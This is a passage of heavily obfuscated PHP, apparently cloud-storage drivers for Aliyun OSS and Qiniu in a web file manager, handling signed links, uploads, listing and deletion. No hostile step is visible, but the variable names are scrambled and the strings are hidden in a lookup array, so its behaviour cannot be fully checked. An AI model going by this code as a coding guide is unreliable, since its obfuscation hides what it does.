* 1024 * 1024 * 8; if (!$ûÛêì›) { return $£½°¥Ë; } $ûÛêì› = $ûÛêì› < 819200 ? 819200 : ($ûÛêì› > 838860800 ? 838860800 : $ûÛêì›); if ($æö¢ÑÊª) { $£½°¥Ë[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ûÛêì›); } else { if (!isset($£½°¥Ë[OSS\OssClient::OSS_HEADERS])) { $£½°¥Ë[OSS\OssClient::OSS_HEADERS] = array(); } $£½°¥Ë[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ûÛêì›); } return $£½°¥Ë; } public function link($µÂô•å, $ˆŸ³úƒõ = array()) { $àÇ±å€æ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->exist($µÂô•å) || $this->isFolder($µÂô•å)) { return !1; } try { $ˆŸ³úƒõ = $this->trafficLimit($àÇ±å€æ[110], $ˆŸ³úƒõ, !0); $ú¡¹µâí = $this->client->signUrl($this->bucket, $this->pathEncode($µÂô•å), 3600 * 12, $àÇ±å€æ[1557], $ˆŸ³úƒõ); return $this->getCdnLink($ú¡¹µâí); } catch (OSS\Core\OssException $£ËúÛ ) { $this->writeLog(__FUNCTION__ . $àÇ±å€æ[213] . $£ËúÛ ->getMessage()); return !1; } } public function fileOut($˜ß›Ú¿š, $Ó÷„çİÂ = false, $¬öªÍÛ´ = false, $à˜€¸¨× = '') { $¸³ñ™ßú =& $_SERVER[‘ÆÜ‘œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($˜ß›Ú¿š, $Ó÷„çİÂ, $¬öªÍÛ´, $à˜€¸¨×); } if (!$¬öªÍÛ´) { $¬öªÍÛ´ = $this->pathThis($˜ß›Ú¿š); } $¬öªÍÛ´ = rawurlencode($¬öªÍÛ´); $Õõ¦™ß = get_file_mime(get_path_ext($¬öªÍÛ´)); if ($Õõ¦™ß == $¸³ñ™ßú[249]) { return parent::fileOut($˜ß›Ú¿š, $Ó÷„çİÂ, $¬öªÍÛ´, $à˜€¸¨×); } $Ó÷„çİÂ = $Ó÷„çİÂ ? $¸³ñ™ßú[1654] : $¸³ñ™ßú[1655]; $Á¶š²Ëš = array(OSS\OssClient::OSS_SUB_RESOURCE => $¸³ñ™ßú[1656] . rawurlencode("{$Ó÷„çİÂ}\x3b\146\x69\154\x65\156\x61\155\145\x3d{$¬öªÍÛ´}")); $­˜Š¹îù = $this->link($˜ß›Ú¿š, $Á¶š²Ëš); $this->fileOutLink($­˜Š¹îù); } public function fileOutServer($ƒ‘£¡—÷, $Ì±ãŠè¼ = false, $ØƒøÒÈ = false, $òŞé®Êµ = '') { parent::fileOut($ƒ‘£¡—÷, $Ì±ãŠè¼, $ØƒøÒÈ, $òŞé®Êµ); } public function fileOutImage($´š˜¬‘ñ, $’ºç¤Ë = 250) { if ($this->size($´š˜¬‘ñ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($´š˜¬‘ñ, $’ºç¤Ë); } $Ç¨ôÏÎ‰ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[‘ÆÜ‘œ][1619] . $’ºç¤Ë); $Çùà½†º = $this->link($´š˜¬‘ñ, $Ç¨ôÏÎ‰); $this->fileOutLink($Çùà½†º); } public function fileOutImageServer($’µÏœ‡¿, $¤Øş—‰¿ = 250) { parent::fileOutImage($’µÏœ‡¿, $¤Øş—‰¿); } public function fileOutLink($€İÓ˜œ¶) { $¤Ö‚è¡‘ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->isCdnHost() && substr($€İÓ˜œ¶, 0, 7) == $¤Ö‚è¡‘[217]) { $€İÓ˜œ¶ = $¤Ö‚è¡‘[218] . substr($€İÓ˜œ¶, 7); } header($¤Ö‚è¡‘[173] . $€İÓ˜œ¶); die; } public function hashMd5($İÌ³İëî, $š‘”¬Ê¾ = '') { $¡‚œ—Ë˜ =& $_SERVER[‘ÆÜ‘œ]; $½ÉÀĞ±ù = $this->_objectMeta($İÌ³İëî); if (!$½ÉÀĞ±ù) { return $¡‚œ—Ë˜[12]; } if (!isset($½ÉÀĞ±ù[$¡‚œ—Ë˜[1639]]) && !empty($š‘”¬Ê¾)) { $³ÙË‚¼Ö = $this->updateObjMeta($İÌ³İëî, array($¡‚œ—Ë˜[1639] => $š‘”¬Ê¾)); $½ÉÀĞ±ù[$¡‚œ—Ë˜[1639]] = $³ÙË‚¼Ö ? $š‘”¬Ê¾ : $¡‚œ—Ë˜[12]; } return isset($½ÉÀĞ±ù[$¡‚œ—Ë˜[1639]]) ? strtolower($½ÉÀĞ±ù[$¡‚œ—Ë˜[1639]]) : $¡‚œ—Ë˜[12]; } public function size($Ôî×äª›) { $Éñ§¶ø¼ = $this->objectMeta($Ôî×äª›); return $Éñ§¶ø¼ ? $Éñ§¶ø¼[$_SERVER[‘ÆÜ‘œ][79]] : 0; } public function info($‰˜çèø) { if ($this->isFolder($‰˜çèø)) { return $this->folderInfo($‰˜çèø); } else { if ($this->isFile($‰˜çèø)) { return $this->fileInfo($‰˜çèø); } } return !1; } public function exist($õ­Áé¢Í) { return $this->isFile($õ­Áé¢Í) || $this->isFolder($õ­Áé¢Í); } public function isFile($®’«€·œ) { return !$this->isFolder($®’«€·œ) && $this->objectMeta($®’«€·œ); } public function isFolder($æíæìâö) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][178], $æíæìâö); } protected function objectMeta($ù·†”ø¢) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][180], $ù·†”ø¢); } protected function _objectMeta($óïÅ‡æŸ) { $î¹êô =& $_SERVER[‘ÆÜ‘œ]; try { $Ñ“ºï·ƒ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($óïÅ‡æŸ)); } catch (OSS\Core\OssException $û‰™‹Ã¸) { $this->writeLog(__FUNCTION__ . $î¹êô[213] . $û‰™‹Ã¸->getMessage()); $Ñ“ºï·ƒ = !1; } if ($Ñ“ºï·ƒ) { $Ñ“ºï·ƒ[$î¹êô[79]] = intval($Ñ“ºï·ƒ[$î¹êô[1637]]); } return $Ñ“ºï·ƒ; } protected function _isFolder($„´ğÀß) { $®ºÆô¦ =& $_SERVER[‘ÆÜ‘œ]; if ($„´ğÀß == $®ºÆô¦[12] || $„´ğÀß == $®ºÆô¦[8]) { return !0; } $¦Ôõœ‡¼ = array($®ºÆô¦[1632] => $®ºÆô¦[8], $®ºÆô¦[1633] => rtrim($„´ğÀß, $®ºÆô¦[8]) . $®ºÆô¦[8], $®ºÆô¦[1634] => 1, $®ºÆô¦[1635] => $®ºÆô¦[12]); $Ì¥€Ö÷¸ = $this->client->listObjects($this->bucket, $¦Ôõœ‡¼); if ($Ì¥€Ö÷¸->getObjectList() || $Ì¥€Ö÷¸->getPrefixList()) { return !0; } return !1; } public function writeLog($¬¥æôÅã = '', $…ÍÜ€«Â = false) { $Üëˆ¥à— =& $_SERVER[‘ÆÜ‘œ]; $÷†‡ÎÙ = in_array(ACTION, array($Üëˆ¥à—[211], $Üëˆ¥à—[212])); if (!$÷†‡ÎÙ && !GLOBAL_DEBUG) { return; } $­èğÀ¹ = 0; if (stripos($¬¥æôÅã, $Üëˆ¥à—[1657]) !== !1) { $­èğÀ¹ = 1; $ĞÇ³°€« = explode($Üëˆ¥à—[1658], $¬¥æôÅã); $¬¥æôÅã = !empty($ĞÇ³°€«[1]) ? $ĞÇ³°€«[1] : $¬¥æôÅã; } else { if (stripos($¬¥æôÅã, $Üëˆ¥à—[1659])) { $­èğÀ¹ = 2; $ĞÇ³°€« = explode($Üëˆ¥à—[1659], $¬¥æôÅã); $ĞÇ³°€« = explode($Üëˆ¥à—[4], $ĞÇ³°€«[0]); $¬¥æôÅã = !empty($ĞÇ³°€«[1]) ? $ĞÇ³°€«[1] : $¬¥æôÅã; } } if ($÷†‡ÎÙ && I18n::getType() == $Üëˆ¥à—[1660]) { if ($­èğÀ¹ == 1) { $¬¥æôÅã = str_replace($Üëˆ¥à—[1661], $Üëˆ¥à—[1662], $¬¥æôÅã); } else { if ($­èğÀ¹ == 2) { $ĞÇ³°€« = explode($Üëˆ¥à—[213], $ĞÇ³°€«[0]); $á ¢ú—ş = isset($ĞÇ³°€«[1]) ? $ĞÇ³°€«[1] : $Üëˆ¥à—[12]; $ÄäÈì“» = array($Üëˆ¥à—[1663] => $Üëˆ¥à—[1664], $Üëˆ¥à—[1665] => $Üëˆ¥à—[1666], $Üëˆ¥à—[1667] => $Üëˆ¥à—[1668], $Üëˆ¥à—[1669] => $Üëˆ¥à—[1670], $Üëˆ¥à—[1671] => $Üëˆ¥à—[1672], $Üëˆ¥à—[1673] => $Üëˆ¥à—[1674], $Üëˆ¥à—[1675] => $Üëˆ¥à—[1676], $Üëˆ¥à—[1677] => $Üëˆ¥à—[1678], $Üëˆ¥à—[1679] => $Üëˆ¥à—[1680], $Üëˆ¥à—[1681] => $Üëˆ¥à—[1682]); if (isset($ÄäÈì“»[$á ¢ú—ş])) { $¬¥æôÅã = $ÄäÈì“»[$á ¢ú—ş]; } } } if (stripos($¬¥æôÅã, $Üëˆ¥à—[1683])) { $¬¥æôÅã = $Üëˆ¥à—[1684]; } } if (!trim($¬¥æôÅã)) { return; } parent::writeLog(trim($¬¥æôÅã), $…ÍÜ€«Â); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($•öµà›÷) { parent::__construct(); require_once SDK_DIR . $_SERVER[‘ÆÜ‘œ][1685]; $this->_init($•öµà›÷); } public function _init($ÜÅšœÒË) { $Ùï–ˆµç =& $_SERVER[‘ÆÜ‘œ]; $this->config = $ÜÅšœÒË; foreach ($ÜÅšœÒË as $Ü÷ß¬¦Ò => $ö• £³ô) { if (isset($this->{$Ü÷ß¬¦Ò})) { $this->{$Ü÷ß¬¦Ò} = $ö• £³ô; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ùï–ˆµç[1686] . LNG($Ùï–ˆµç[1623])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($óúÑÑ·è, $Ü‡šµÄœ = '', $ŒÅ¤Ğœš = REPEAT_RENAME) { if ($this->setContent($óúÑÑ·è, $Ü‡šµÄœ)) { return $this->getPathOuter($óúÑÑ·è); } return !1; } public function mkdir($¬®òèï…, $É¥¬Ó• = REPEAT_SKIP) { $İˆšıß =& $_SERVER[‘ÆÜ‘œ]; $¿šÉ²Ñœ = trim($¬®òèï…, $İˆšıß[8]); if ($this->_isFolder($¿šÉ²Ñœ)) { return $this->getPathOuter($¿šÉ²Ñœ); } $¬®òèï… = $¿šÉ²Ñœ . $İˆšıß[8]; $ùşÜÏÚ = get_path_this($¿šÉ²Ñœ); $óíÔå › = $¬®òèï… . $ùşÜÏÚ; if (!$this->mkfile($óíÔå ›)) { return !1; } if (!$this->moveFile($óíÔå ›, $¬®òèï…)) { $this->delFile($óíÔå ›); return !1; } return $this->getPathOuter($¿šÉ²Ñœ); } public function copyFile($ÔÄ‘×š¢, $óİ„£ï) { $»­ÓİäÁ = $this->bucketManager->copy($this->bucket, $ÔÄ‘×š¢, $this->bucket, $óİ„£ï, !0); return $»­ÓİäÁ ? !1 : $this->getPathOuter($óİ„£ï); } public function moveFile($¨Á¤·´, $÷¯¡Î±Ï) { $§Óòï©Ø = $this->bucketManager->move($this->bucket, $¨Á¤·´, $this->bucket, $÷¯¡Î±Ï, !0); return $§Óòï©Ø ? !1 : $this->getPathOuter($÷¯¡Î±Ï); } public function delFile($Êí«ş ) { if (!$this->exist($Êí«ş )) { return !0; } $²úı©ó = $this->bucketManager->delete($this->bucket, $Êí«ş ); if (!$²úı©ó) { return !0; } return $²úı©ó->code() == 612 ? !0 : !1; } public function delFolder($á£Ş§Ÿ¹) { $ğ–ì†Õò =& $_SERVER[‘ÆÜ‘œ]; if (!$this->exist($á£Ş§Ÿ¹)) { return !0; } $this->listItemCache = !1; $Ù¥­ü‰Ó = $this->fileList($á£Ş§Ÿ¹); $this->listItemCache = !0; $½şÎÜ¿’ = trim($á£Ş§Ÿ¹, $ğ–ì†Õò[8]) . $ğ–ì†Õò[8]; if (!empty($á£Ş§Ÿ¹) && $á£Ş§Ÿ¹ !== $ğ–ì†Õò[229] && !in_array($½şÎÜ¿’, $Ù¥­ü‰Ó[$ğ–ì†Õò[85]])) { $Ù¥­ü‰Ó[$ğ–ì†Õò[85]][] = $½şÎÜ¿’; } $æ’›´ï– = $this->delByBatch($Ù¥­ü‰Ó[$ğ–ì†Õò[86]]); if (!$æ’›´ï–) { return !1; } $æ’›´ï– = $this->delByBatch($Ù¥­ü‰Ó[$ğ–ì†Õò[85]]); if (!$æ’›´ï–) { return !1; } return $this->delFile($½şÎÜ¿’); } private function delByBatch($¡¼„úÒü) { foreach (array_chunk($¡¼„úÒü, 1000) as $ÑœäøÏÇ) { $æØíî‘È = $this->bucketManager->buildBatchDelete($this->bucket, $ÑœäøÏÇ); list($ó´·‡Ø÷, $ºô®’°ï) = $this->bucketManager->batch($æØíî‘È); if ($ºô®’°ï) { return !1; } } return !0; } public function rename($øòäË•, $ş®ÏıÌÊ) { return $this->renameObject($øòäË•, $ş®ÏıÌÊ); } public function fileInfo($Âˆ±»ˆİ, $½‘¶ëã = false, $¬¢ƒ’¤Ö = array()) { $ôçİÈÌ =& $_SERVER[‘ÆÜ‘œ]; $‰¿ğÈ¿¦ = array($ôçİÈÌ[32] => $this->pathThis($Âˆ±»ˆİ), $ôçİÈÌ[87] => $this->getPathOuter($ôçİÈÌ[8] . $Âˆ±»ˆİ), $ôçİÈÌ[33] => $ôçİÈÌ[231], $ôçİÈÌ[79] => isset($¬¢ƒ’¤Ö[$ôçİÈÌ[1687]]) ? $¬¢ƒ’¤Ö[$ôçİÈÌ[1687]] : 0, $ôçİÈÌ[167] => $this->ext($Âˆ±»ˆİ)); if ($½‘¶ëã) { return $‰¿ğÈ¿¦; } $‰¿ğÈ¿¦[$ôçİÈÌ[232]] = $‰¿ğÈ¿¦[$ôçİÈÌ[88]] = 0; $‰¿ğÈ¿¦[$ôçİÈÌ[233]] = $‰¿ğÈ¿¦[$ôçİÈÌ[234]] = !0; if (empty($¬¢ƒ’¤Ö)) { $¬¢ƒ’¤Ö = $this->objectMeta($Âˆ±»ˆİ); if (!$¬¢ƒ’¤Ö) { return $‰¿ğÈ¿¦; } } if (isset($¬¢ƒ’¤Ö[$ôçİÈÌ[235]]) && $¬¢ƒ’¤Ö[$ôçİÈÌ[235]]) { $‰¿ğÈ¿¦[$ôçİÈÌ[236]] = $¬¢ƒ’¤Ö[$ôçİÈÌ[235]]; } if (isset($¬¢ƒ’¤Ö[$ôçİÈÌ[246]]) && $¬¢ƒ’¤Ö[$ôçİÈÌ[246]]) { $‰¿ğÈ¿¦[$ôçİÈÌ[236]] = $¬¢ƒ’¤Ö[$ôçİÈÌ[246]]; } if (isset($¬¢ƒ’¤Ö[$ôçİÈÌ[1688]])) { $‰¿ğÈ¿¦[$ôçİÈÌ[88]] = substr($¬¢ƒ’¤Ö[$ôçİÈÌ[1688]] . $ôçİÈÌ[12], 0, 10); } if (isset($¬¢ƒ’¤Ö[$ôçİÈÌ[1687]])) { $‰¿ğÈ¿¦[$ôçİÈÌ[79]] = $¬¢ƒ’¤Ö[$ôçİÈÌ[1687]]; } return $‰¿ğÈ¿¦; } public function folderInfo($Ø°í¿Ş, $Õ— ¤»Ã = false) { $ÓóıÀìÙ =& $_SERVER[‘ÆÜ‘œ]; $ìö°Ÿº = array($ÓóıÀìÙ[32] => $this->pathThis($Ø°í¿Ş), $ÓóıÀìÙ[87] => $this->getPathOuter($ÓóıÀìÙ[8] . $Ø°í¿Ş), $ÓóıÀìÙ[33] => $ÓóıÀìÙ[78]); if ($Õ— ¤»Ã) { return $ìö°Ÿº; } $ìö°Ÿº[$ÓóıÀìÙ[232]] = $ìö°Ÿº[$ÓóıÀìÙ[88]] = 0; $ìö°Ÿº[$ÓóıÀìÙ[233]] = $ìö°Ÿº[$ÓóıÀìÙ[234]] = !0; $Ø°í¿Ş = rtrim($Ø°í¿Ş, $ÓóıÀìÙ[8]) . $ÓóıÀìÙ[8]; $Ùù²©—‡ = $this->objectMeta($Ø°í¿Ş); if (isset($Ùù²©—‡[$ÓóıÀìÙ[1688]])) { $ìö°Ÿº[$ÓóıÀìÙ[88]] = substr($Ùù²©—‡[$ÓóıÀìÙ[1688]] . $ÓóıÀìÙ[12], 0, 10); } return $ìö°Ÿº; } public function listPath($ëÙúŞÜî, $Æ­ªõÍË = false) { $´Ü„•Ôõ =& $_SERVER[‘ÆÜ‘œ]; $ÀŞ’Ñ‰Ö = $this->fileList($ëÙúŞÜî, $´Ü„•Ôõ[8], !0); foreach ($ÀŞ’Ñ‰Ö[$´Ü„•Ôõ[85]] as $®åşÂòù => $ã¸Ÿ ´£) { $ÀŞ’Ñ‰Ö[$´Ü„•Ôõ[85]][$®åşÂòù] = $this->folderInfo($ã¸Ÿ ´£, $Æ­ªõÍË); } foreach ($ÀŞ’Ñ‰Ö[$´Ü„•Ôõ[86]] as $®åşÂòù => $ã¸Ÿ ´£) { $ÀŞ’Ñ‰Ö[$´Ü„•Ôõ[86]][$®åşÂòù] = $this->fileInfo($ã¸Ÿ ´£[$´Ü„•Ôõ[32]], $Æ­ªõÍË, $ã¸Ÿ ´£); } return $ÀŞ’Ñ‰Ö; } public function has($ŞŠŠª´ƒ, $şæ½ã» = false, $‡ğ³«— = true) { $îÆªÀ =& $_SERVER[‘ÆÜ‘œ]; $ŞŠŠª´ƒ = trim($ŞŠŠª´ƒ, $îÆªÀ[8]); $Ê‹„¾¾ù = empty($ŞŠŠª´ƒ) && $ŞŠŠª´ƒ !== $îÆªÀ[229] ? $îÆªÀ[12] : $ŞŠŠª´ƒ . $îÆªÀ[8]; $Á‰¥èĞ® = $îÆªÀ[12]; $Ïî®±ç„ = 500; $ùšØ¾Œç = $îÆªÀ[8]; $ÖƒÄ¸³  = $Ÿ‚œ¤âÄ = 0; while (!0) { check_abort(); list($ûååšøì, $†¥•Ûªã) = $this->bucketManager->listFiles($this->bucket, $Ê‹„¾¾ù, $Á‰¥èĞ®, $Ïî®±ç„, $ùšØ¾Œç); if ($†¥•Ûªã) { break; } $Á‰¥èĞ® = array_key_exists($îÆªÀ[1635], $ûååšøì) ? $Á‰¥èĞ® = $ûååšøì[$îÆªÀ[1689]] : $îÆªÀ[12]; if ($şæ½ã») { if (!empty($ûååšøì[$îÆªÀ[1690]])) { $ÖƒÄ¸³  += count($ûååšøì[$îÆªÀ[1690]]); } if (!empty($ûååšøì[$îÆªÀ[1691]])) { $Ÿ‚œ¤âÄ += count($ûååšøì[$îÆªÀ[1691]]); } if ($Á‰¥èĞ® === $îÆªÀ[12]) { break; } continue; } if ($‡ğ³«—) { if (!empty($ûååšøì[$îÆªÀ[1690]])) { return !0; } } else { if (!empty($ûååšøì[$îÆªÀ[1691]])) { return !0; } } if ($Á‰¥èĞ® === $îÆªÀ[12]) { break; } } if ($şæ½ã») { return array($îÆªÀ[240] => $ÖƒÄ¸³ , $îÆªÀ[241] => $Ÿ‚œ¤âÄ); } return !1; } public function listAll($ö¹ä®¼å) { $­ÕŠûı  =& $_SERVER[‘ÆÜ‘œ]; $“œó©û = $this->fileList($ö¹ä®¼å, $­ÕŠûı [12], !0); $ş»úíÍÜ = array_to_keyvalue($“œó©û[$­ÕŠûı [86]], $­ÕŠûı [32]); foreach ($“œó©û[$­ÕŠûı [85]] as $ËÂòöÔ¿) { if (is_string($ËÂòöÔ¿)) { $ş»úíÍÜ[$ËÂòöÔ¿] = array($­ÕŠûı [79] => 0); } } return $this->listAllFiles($ö¹ä®¼å, $ş»úíÍÜ); } private function fileList($ºˆ¡ø·¼, $Åû¯…Ì‰ = '', $Äş¹ïÎ = 0) { $—Õç…Ÿ =& $_SERVER[‘ÆÜ‘œ]; $ºˆ¡ø·¼ = trim($ºˆ¡ø·¼, $—Õç…Ÿ[8]); $‹æÍÓˆš = empty($ºˆ¡ø·¼) && $ºˆ¡ø·¼ !== $—Õç…Ÿ[229] ? $—Õç…Ÿ[12] : $ºˆ¡ø·¼ . $—Õç…Ÿ[8]; $õ›ü©ıï = $—Õç…Ÿ[12]; $•¢¾ Ï = 1000; $­çĞ = $âÛÊú¼ø = array(); while (!0) { check_abort(); list($ËŸìÃòê, $“ƒµœè±) = $this->bucketManager->listFiles($this->bucket, $‹æÍÓˆš, $õ›ü©ıï, $•¢¾ Ï, $Åû¯…Ì‰); if ($“ƒµœè±) { break; } $õ›ü©ıï = array_key_exists($—Õç…Ÿ[1635], $ËŸìÃòê) ? $õ›ü©ıï = $ËŸìÃòê[$—Õç…Ÿ[1689]] : $—Õç…Ÿ[12]; $ßÈÂ³À‡ = isset($ËŸìÃòê[$—Õç…Ÿ[1690]]) ? $ËŸìÃòê[$—Õç…Ÿ[1690]] : array(); $ùµ½Ù = isset($ËŸìÃòê[$—Õç…Ÿ[1691]]) ? $ËŸìÃòê[$—Õç…Ÿ[1691]] : array(); foreach ($ßÈÂ³À‡ as $Ï„Ÿ©æ„) { if ($Ï„Ÿ©æ„[$—Õç…Ÿ[95]] == $‹æÍÓˆš) { continue; } $Ò•¶£Ú™ = $Ï„Ÿ©æ„[$—Õç…Ÿ[95]]; $—¤ƒ«» = $Ï„Ÿ©æ„[$—Õç…Ÿ[1687]]; $Ï„Ÿ©æ„[$—Õç…Ÿ[32]] = $Ò•¶£Ú™; $Ï„Ÿ©æ„[$—Õç…Ÿ[79]] = $—¤ƒ«»; $­‹Õ„³¹ = $—¤ƒ«» == 0 && substr($Ò•¶£Ú™, strlen($Ò•¶£Ú™) - 1, 1) == $—Õç…Ÿ[8] ? !0 : !1; $this->cacheMethodInfoSet($Ò•¶£Ú™, $­‹Õ„³¹, $Ï„Ÿ©æ„); if ($­‹Õ„³¹) { $­çĞ[] = $Ò•¶£Ú™; continue; } $âÛÊú¼ø[] = $Äş¹ïÎ ? $Ï„Ÿ©æ„ : $Ò•¶£Ú™; } foreach ($ùµ½Ù as $Ò•¶£Ú™) { if ($Ò•¶£Ú™ == $‹æÍÓˆš) { continue; } $­çĞ[] = $Ò•¶£Ú™; $this->cacheMethodInfoSet($Ò•¶£Ú™, !0); } if ($õ›ü©ıï === $—Õç…Ÿ[12]) { break; } } $this->cacheMethodInfoSet($ºˆ¡ø·¼, !0); return array($—Õç…Ÿ[85] => $­çĞ, $—Õç…Ÿ[86] => $âÛÊú¼ø); } public function canRead($à‘¼£‡) { return $this->exist($à‘¼£‡) ? !0 : !1; } public function canWrite($‘€è…˜) { return $this->exist($‘€è…˜) ? !0 : !1; } public function getContent($Ï‰¡İóß) { return $this->fileSubstr($Ï‰¡İóß, 0, -1); } public function setContent($Ï°¾ƒ, $­¬º’ÂÑ = '') { $“»ğõ‹Ú = $this->tempFile($this->pathThis($Ï°¾ƒ)); file_put_contents($“»ğõ‹Ú, $­¬º’ÂÑ); if ($this->upload($Ï°¾ƒ, $“»ğõ‹Ú)) { $this->tempFileRemve($“»ğõ‹Ú); return !0; } return !1; } public function refreshUrls($î•°”Ã£) { $» “úÁ =& $_SERVER[‘ÆÜ‘œ]; $Í“ŒçË = array(); if (is_array($î•°”Ã£)) { foreach ($î•°”Ã£ as $éÁŸÃÈ) { $Í“ŒçË[] = $this->link($éÁŸÃÈ); } } else { $Í“ŒçË[] = $this->link($î•°”Ã£); } $ê½•äŒ¤ = new Qiniu\Cdn\CdnManager($this->auth); list($ÚÁâäõ, $­’„‚–ù) = $ê½•äŒ¤->refreshUrls($Í“ŒçË); if ($­’„‚–ù) { return !1; } return $ÚÁâäõ[$» “úÁ[1319]] == $» “úÁ[867] ? !0 : !1; } public function fileSubstr($ñäáØòŒ, $”ƒõ”ï, $¡ëšÖïó) { $Š—ªšî“ =& $_SERVER[‘ÆÜ‘œ]; if (!($´Ø ºÆê = $this->link($ñäáØòŒ))) { return !1; } $¡¥ŒÖÎ‘ = !1; if ($¡ëšÖïó > 0) { $ë¥úÅö× = $”ƒõ”ï + $¡ëšÖïó - 1; $¡¥ŒÖÎ‘ = array($Š—ªšî“[1556] . $”ƒõ”ï . $Š—ªšî“[485] . $ë¥úÅö×); } $–ŒÁ¶ë” = url_request($´Ø ºÆê, $Š—ªšî“[1557], !1, $¡¥ŒÖÎ‘); return $–ŒÁ¶ë”[$Š—ªšî“[857]] ? $–ŒÁ¶ë”[$Š—ªšî“[1341]] : !1; } public function upload($°Â¡Â¤, $«³„˜šÓ, $¹ÓŠ’îÇ = false, $ë§ôÑŠÆ = REPEAT_REPLACE) { if (!$«³„˜šÓ || !@file_exists($«³„˜šÓ)) { return !1; } $ªº›úô› = new Qiniu\Storage\UploadManager(); $íğ÷½§ã = $this->auth->uploadToken($this->bucket, $°Â¡Â¤); $ë²ˆ»ä = get_file_mime(get_path_ext($«³„˜šÓ)); list($¤¾ˆÑç¾, $¨‰¿Ç¦•) = $ªº›úô›->putFile($íğ÷½§ã, $°Â¡Â¤, $«³„˜šÓ, null, $ë²ˆ»ä); return $¨‰¿Ç¦• ? !1 : $this->getPathOuter($°Â¡Â¤); } public function uploadFormData($Êä¶ïï†, $»‚š¡‘ö = 3600) { return $this->uploadToken($Êä¶ïï†, $»‚š¡‘ö); } public function uploadMultiData($Øˆ—Õ, $úî³ö’Õ = 3600) { return $this->uploadToken($Øˆ—Õ, $úî³ö’Õ); } private function uploadToken($ıœâˆìÕ, $âÒå±üë = 3600) { $ÄßÍòé¶ =& $_SERVER[‘ÆÜ‘œ]; $€ş±Äùç = $âÒå±üë; $®šì‰Íú = array($ÄßÍòé¶[1692] => $ÄßÍòé¶[1693]); $´²ĞÚÍØ = $ıœâˆìÕ; $ã•»øã = $this->auth->uploadToken($this->bucket, $´²ĞÚÍØ, $€ş±Äùç, $®šì‰Íú, !0); $´Ê–£Ÿ˜ = empty($this->region) || $this->region == $ÄßÍòé¶[1694] ? $ÄßÍòé¶[12] : $ÄßÍòé¶[485] . $this->region; $Ğ–ªßäµ = http_type() . "\x3a\57\x2f\x75\160\154\157\x61\144{$´Ê–£Ÿ˜}\x2e\161\x69\x6e\x69\165\x70\x2e\143\157\155\x2f"; return array($ÄßÍòé¶[1695] => $ã•»øã, $ÄßÍòé¶[1559] => $Ğ–ªßäµ); } public function download($­Û¤Ş¶Ü, $Æ“ŠÓ‰») { $†¶æÂå = IO::getPathInner(IO::mkfile($Æ“ŠÓ‰»)); if (!($×µ‰¹å» = $this->link($­Û¤Ş¶Ü))) { return !1; } $·áß¬´Ÿ = 0; $ş¶÷ù†Ş = 1024 * 200; $Ùç‰¤êî = fopen($†¶æÂå, $_SERVER[‘ÆÜ‘œ][1696]); while (!0) { $ôÆ±ä í = $this->fileSubstr($­Û¤Ş¶Ü, $·áß¬´Ÿ, $ş¶÷ù†Ş); if ($ôÆ±ä í === !1) { return !1; } fwrite($Ùç‰¤êî, $ôÆ±ä í); $·áß¬´Ÿ += $ş¶÷ù†Ş; if (strlen($ôÆ±ä í) < $ş¶÷ù†Ş) { break; } } fclose($Ùç‰¤êî); return $Æ“ŠÓ‰»; } public function link($²˜Ùşı—, $ªº ‰’Û = '') { if (!$this->isFile($²˜Ùşı—)) { return !1; } $Ö”µ’ = $this->getHost() . $_SERVER[‘ÆÜ‘œ][8] . $this->pathEncode($²˜Ùşı—) . $ªº ‰’Û; return $this->auth->privateDownloadUrl($Ö”µ’, 3600 * 12); } public function fileOut($£Î›„”·, $óîØ­ò = false, $İª¾À°Ã = false, $„¾Ü„ü¶ = '') { $üõãš—Î =& $_SERVER[‘ÆÜ‘œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($£Î›„”·, $óîØ­ò, $İª¾À°Ã, $„¾Ü„ü¶); } if (!$İª¾À°Ã) { $İª¾À°Ã = $this->pathThis($£Î›„”·); } $²˜Ñš·™ = $óîØ­ò ? $üõãš—Î[1697] . rawurlencode($İª¾À°Ã) : $üõãš—Î[12]; $¸ÊÑŸ¾É = $this->link($£Î›„”·, $²˜Ñš·™); $this->fileOutLink($¸ÊÑŸ¾É); } public function fileOutServer($ş”Û‰ô, $Ÿ¿óßÔÍ = false, $½®âñ‰ß = false, $ÊëŞ•š = '') { parent::fileOut($ş”Û‰ô, $Ÿ¿óßÔÍ, $½®âñ‰ß, $ÊëŞ•š); } public function fileOutImage($ù¹•“ì, $î½–£™— = 250) { if ($this->size($ù¹•“ì) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ù¹•“ì, $î½–£™—); } $¿Ûüèİ¿ = $this->link($ù¹•“ì, $_SERVER[‘ÆÜ‘œ][1698] . $î½–£™—); $this->fileOutLink($¿Ûüèİ¿); } public function fileOutImageServer($¨¥×Ì½ò, $ÜŒÓïŸÓ = 250) { parent::fileOutImage($¨¥×Ì½ò, $ÜŒÓïŸÓ); } public function hashMd5($åƒğÒš) { $ÄÅ‹ıóÎ =& $_SERVER[‘ÆÜ‘œ]; $óÜ–’ØÆ = $this->objectMeta($åƒğÒš); return isset($óÜ–’ØÆ[$ÄÅ‹ıóÎ[246]]) ? $óÜ–’ØÆ[$ÄÅ‹ıóÎ[246]] : !1; $ÅÊšÖƒˆ = $this->link($åƒğÒš, $ÄÅ‹ıóÎ[1699]); } public function size($¦Á¶çâ­) { $úÕ»ä­à = $this->objectMeta($¦Á¶çâ­); return 